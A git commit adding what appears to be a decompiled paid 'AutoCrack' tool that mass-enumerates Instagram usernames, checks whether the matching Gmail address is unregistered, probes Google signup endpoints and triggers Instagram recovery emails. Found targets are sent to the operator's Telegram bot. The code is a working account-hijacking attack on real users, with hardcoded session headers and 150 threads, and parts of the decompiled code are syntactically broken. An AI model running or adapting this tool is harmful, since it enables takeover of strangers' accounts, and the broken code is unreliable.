8d1263dbab8ca7dd9053e7aca34a02448ed10204
TalhaArian <82194528+TalhaArian@users.noreply.github.com>
2024-05-15 13:20:38 +0600

    Add files via upload

---
+++ dec_AutoCrack.py
@@ -0,0 +1,250 @@
+
+import lzma
+import zlib
+import codecs
+import base64
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
+
+foo = False
+if foo:
+    pass
+import requests
+import os
+import time
+from time import time
+from hashlib import md5
+from user_agent import generate_user_agent
+from random import randrange
+from threading import Thread
+from requests import post as pp
+from user_agent import generate_user_agent as gg
+from random import choice as cc
+from random import randrange as okk
+from uuid import uuid5
+from datetime import datetime
+
+def check_date():
+    target_date = datetime(2024, 5, 12, 11, 0)
+    current_date = datetime.now()
+    if current_date > target_date:
+        print('\nChauhan is not a nice person.')
+        exit()
+
+check_date()
+os.system('clear')
+O = '\x1b[38;5;208m'
+R = '\x1b[1;31m'
+X = '\x1b[1;33m'
+F = '\x1b[2;32m'
+C = '\x1b[1;97m'
+B = '\x1b[2;36m'
+K = '\x1b[2;35m'
+C1 = '\x1b[2;35m'
+B = '\x1b[2;36m'
+E = '\x1b[1;31m'
+G = '\x1b[1;35m'
+Z = '\x1b[1;31m'
+X = '\x1b[1;33m'
+Z1 = '\x1b[2;31m'
+F = '\x1b[2;32m'
+A = '\x1b[2;34m'
+C = '\x1b[2;35m'
+B = '\x1b[38;5;208m'
+Y = '\x1b[1;34m'
+M = '\x1b[1;37m'
+S = '\x1b[1;33m'
+U = '\x1b[1;37m'
+BRed = '\x1b[1;31m'
+BGreen = '\x1b[1;32m'
+BYellow = '\x1b[1;33m'
+R = '\x1b[1;34m'
+BPurple = '\x1b[1;35m'
+BCyan = '\x1b[1;36m'
+BWhite = '\x1b[1;37m'
+print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}\n|{Z}[+] TeleGram  : {B} hackjackingbot    |\n|{Z}[+] Instagram  : {B}sir.n4waz |\n\n𝙋𝙖𝙞𝙙 𝙏𝙤𝙤𝙡 𝘽𝙮 - @𝙉𝙖𝙬𝙖𝙯_𝙢𝙮𝙩𝙝𝙞𝙘\n-------------------------------\n{B}[+]Time limit - 1 days\n{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━\n    ██╗  ██╗██╗   ██╗ ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗\n    ██║ ██╔╝╚██╗ ██╔╝██╔════╝██║ ██╔╝██║████╗  ██║██╔═══██╗\n    █████╔╝  ╚████╔╝ ██║     █████╔╝ ██║██╔██╗ ██║██║   ██║\n    ██╔═██╗   ╚██╔╝  ██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║\n    ██║  ██╗   ██║   ╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝\n    ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝\n                    V2\n    ''')
+mj = 0
+yy = 'azertyuiopmlkjhgfdsqwxcvbn'
+ids = []
+(bad, bad2, good, good2) = (0, 0, 0, 0)
+tok = input(' \x1b[1;31mEnter Token : ')
+iD = input(' \x1b[2;36mEnter Id : ')
+os.system('clear')
+print('\n')
+
+def check(username):
+    email = username
+    url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
+    head = {
+        'Host': 'www.instagram.com',
+        'origin': 'https://www.instagram.com',
+        'referer': 'https://www.instagram.com/accounts/signup/email/',
+        'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
+        'user-agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)' }
+    data = {
+        'email': email + '@gmail.com' }
+    re = requests.post(url, head, data, **('headers', 'data')).text
+    if 'email_is_taken' in re:
+        print(X + f'''Available IG : {email}@gmail.com''')
+        (tl, host) = tll()
+        cookies = {
+            '__Host-GAPS': host }
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
+            'user-agent': str(generate_user_agent()) }
+        params = {
+            'TL': tl }
+        data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + email + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
+        response = pp('https://accounts.google.com/_/signup/usernameavailability', params, cookies, headers, data, **('params', 'cookies', 'headers', 'data'))
+        if '"gf.uar",1' in str(response.text):
+            headers2 = {
+                'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
+                'X-Pigeon-Rawclienttime': '1700251574.982',
+                'X-IG-Connection-Speed': '-1kbps',
+                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
+                'X-IG-Bandwidth-TotalBytes-B': '0',
+                'X-IG-Bandwidth-TotalTime-MS': '0',
+                'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+                'X-IG-Connection-Type': 'WIFI',
+                'X-IG-Capabilities': '3brTvw==',
+                'X-IG-App-ID': '567067343352427',
+                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
+                'Accept-Language': 'en-GB, en-US',
+                'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Accept-Encoding': 'gzip, deflate',
+                'Host': 'i.instagram.com',
+                'X-FB-HTTP-Engine': 'Liger',
+                'Connection': 'keep-alive',
+                'Content-Length': '356' }
+            data2 = {
+                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + email + '"}',
+                'ig_sig_key_version': '4' }
+            req = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers2, data2, **('headers', 'data'))
+            
+            try:
+                rest = req.json()['email']
+            finally:
+                pass
+            rest = ''
+            hunt = f'''\n𓊆𝐴𝐶𝐶𝑂𝑈𝑁𝑇 𝐼𝑁𝑆𝑇𝐴𝐺𝑅𝐴𝑀𓊇\n----------𓆩 Sir Nawaz 𓆪‏----------\n-----------------------------------------\n\nEmail : {email}@gmail.com\nRest : {rest}\n\nBy - @Nawaz_mythic'''
+            print(F + hunt)
+            requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={iD}&text=''' + str(hunt))
+            print(X + f'''Un Gm : {email}@gmail.com''')
+            print(R + f'''Un IG : {email}@gmail.com''')
+            return None
+
+
+
+def cokadada():
+    cokANDdata = requests.get('https://login.aol.com/account/create', {
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
+        'accept-language': 'en-US,en;q=0.9' }, **('headers',))
+    AS = cokANDdata.cookies.get_dict()['AS']
+    A1 = cokANDdata.cookies.get_dict()['A1']
+    A3 = cokANDdata.cookies.get_dict()['A3']
+    A1S = cokANDdata.cookies.get_dict()['A1S']
+    specData = cokANDdata.text.split('name="attrSetIndex">\n        <input type="hidden" value="')[1].split('" name="specData">')[0]
+    specId = cokANDdata.text.split('name="browser-fp-data" id="browser-fp-data" value="" />\n        <input type="hidden" value="')[1].split('" name="specId">')[0]
+    crumb = cokANDdata.text.split('name="cacheStored">\n        <input type="hidden" value="')[1].split('" name="crumb">')[0]
+    sessionIndex = cokANDdata.text.split('"acrumb">\n        <input type="hidden" value="')[1].split('" name="sessionIndex">')[0]
+    acrumb = cokANDdata.text.split('name="crumb">\n        <input type="hidden" value="')[1].split('" name="acrumb">')[0]
+    return (AS, A1, A3, A1S, specData, specId, crumb, acrumb, sessionIndex)
+
+
+def tll():
+    
+    try:
+        n1 = ''.join((lambda .0: for i in .0:
+cc(yy))(range(okk(6, 9))))
+        n2 = ''.join((lambda .0: for i in .0:
+cc(yy))(range(okk(3, 9))))
+        host = ''.join((lambda .0: for i in .0:
+cc(yy))(range(okk(15, 30))))
+        cookies = {
+            '__Host-GAPS': host }
+        headers = {
+            'authority': 'accounts.google.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'google-accounts-xsrf': '1',
+            'origin': 'https://accounts.google.com',
+            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
+            'user-agent': str(generate_user_agent()) }
+        data = {
+            'f.req': '["AEThLlz4luDk2yFWsQRU_KlZsoYtu6wNeZxocOIcj1BG20WA078YKjPYBHlgL8qq82PZDts7UWS0jQ2QmOU-Fh9UrfhgvRXgjlgxmWn2VptjYAi-emfCuzIezrd4IbKkWLbdSPxnA_mTSmtNVuiqJU_VZfR-KE3MtZf8qft2oqLdafTBloXqbn65aQv_o_DuwIR7pG6MmB_g","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
+            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]' }
+        response = pp('https://accounts.google.com/_/signup/validatepersonaldetails', cookies, headers, data, **('cookies', 'headers', 'data'))
+        tl = str(response.text).split('",null,"')[1].split('"')[0]
+        host = response.cookies.get_dict()['__Host-GAPS']
+    finally:
+        return None
+        Exception
+        e = None
+        
+        try:
+            tll()
+        finally:
+            e = None
+            del e
+        e = None
+        del e
+        return None
+
+
+
+ids = []
+
+def get_id():
+    id = str(randrange(10000, 410737614))
+    if id not in ids:
+        ids.append(id)
+        return id
+    None()
+
+
+def get_username():
+    
+    try:
+        id = get_id()
+        csrftoken = md5(str(time()).encode()).hexdigest()
+        headers = {
+            'authority': 'www.instagram.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dnt': '1',
+            'dpr': '0.8',
+            'origin': 'https://www.instagram.com',
+            'user-agent': generate_user_agent(),
+            'x-csrftoken': csrftoken }
+        data = {
+            '__spin_b': 'trunk',
+            'fb_api_caller_class': 'RelayModern',
+            'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
+            'variables': '{"userID":"' + id + '","username":"0s9s"}',
+            'server_timestamps': 'true',
+            'doc_id': '7666785636679494' }
+        response = requests.post('https://www.instagram.com/graphql/query', headers, data, **('headers', 'data')).json()
+        username = response['data']['user']['username']
+        if '_' in username:
+            pass
+        elif len(username) >= 4:
+            check(username)
+    finally:
+        continue
+        BaseException
+        continue
+        continue
+        return None
+
+
+for i in range(150):
+    Thread(get_username, **('target',)).start()
+
